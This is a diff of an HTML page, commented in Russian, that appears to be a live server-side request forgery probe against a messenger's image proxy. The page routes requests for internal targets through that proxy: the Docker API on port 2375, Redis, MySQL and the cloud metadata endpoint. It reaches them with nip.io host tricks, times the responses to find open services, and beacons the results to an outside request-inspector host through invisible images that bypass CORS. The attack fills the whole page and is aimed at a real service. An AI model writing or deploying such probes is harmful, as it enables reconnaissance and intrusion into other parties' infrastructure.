@@ -2,44 +2,52 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Network Security Check</title>
-    <link rel="prefetch" href="https://01kghyewqpr6gac146mvj6nt9400-08f6870c60f820d7da1f.requestinspector.com/SERVER_PING">
+    <title>Infrastructure Test</title>
 </head>
 <body>
-    <h1 id="status">Анализ системы... подождите</h1>
+    <h1 id="status">Запуск теста...</h1>
+    <div id="results"></div>
+
     <script>
         const inspector = "https://01kghyewqpr6gac146mvj6nt9400-08f6870c60f820d7da1f.requestinspector.com";
         const proxy = "https://max.ru/proxy?url=";
         
         const targets = [
-            {n: "Docker", u: "http://127.0.0.1.nip.io:2375/v1.24/containers/json"},
-            {n: "MySQL", u: "http://127.0.0.1.nip.io:3306"},
-            {n: "Metadata", u: "http://169.254.169.254.nip.io/latest/meta-data/"},
-            {n: "Redis", u: "http://127.0.0.1.nip.io:6379"}
+            {n: "Docker", u: "http://127.0.0.1.nip.io:2375"},
+            {n: "Redis", u: "http://127.0.0.1.nip.io:6379"},
+            {n: "Metadata", u: "http://169.254.169.254.nip.io/latest/meta-data/"}
         ];
 
-        async function run() {
-            for (let t of targets) {
-                const start = Date.now();
-                try {
-                    // Самый важный запрос, который дал 6 секунд в прошлый раз
-                    await fetch(`${proxy}${encodeURIComponent(t.u)}`, { 
-                        mode: 'no-cors',
-                        cache: 'no-cache'
-                    });
-                } catch (e) {}
-                
-                const diff = Date.now() - start;
-                
-                // Отправляем результат в инспектор
-                fetch(`${inspector}/REPORT?target=${t.n}&time=${diff}ms`);
-                
-                document.body.innerHTML += `<p>${t.n}: ${diff}ms</p>`;
-            }
-            document.getElementById('status').innerText = "Анализ завершен!";
+        function logToInspector(name, time) {
+            // Создаем невидимую картинку, чтобы отправить данные на инспектор в обход CORS
+            const img = new Image();
+            img.src = `${inspector}/REPORT?target=${name}&time=${time}ms&nonce=${Math.random()}`;
         }
 
-        run();
+        async function start() {
+            for (let t of targets) {
+                const start = Date.now();
+                
+                // Создаем элемент картинки, который пойдет через прокси мессенджера
+                const probe = new Image();
+                // Это заставит СЕРВЕР VK попытаться скачать "картинку" с порта 2375
+                probe.src = `${proxy}${encodeURIComponent(t.u)}/favicon.ico?cb=${start}`;
+                
+                // Ждем 7 секунд или пока "картинка" не выдаст ошибку
+                await new Promise(resolve => {
+                    probe.onload = probe.onerror = resolve;
+                    setTimeout(resolve, 7000); 
+                });
+
+                const duration = Date.now() - start;
+                logToInspector(t.n, duration);
+                
+                document.getElementById('results').innerHTML += `<p>${t.n}: ${duration}ms</p>`;
+            }
+            document.getElementById('status').innerText = "Готово! Проверяй инспектор.";
+        }
+
+        start();
     </script>
 </body>
 </html>
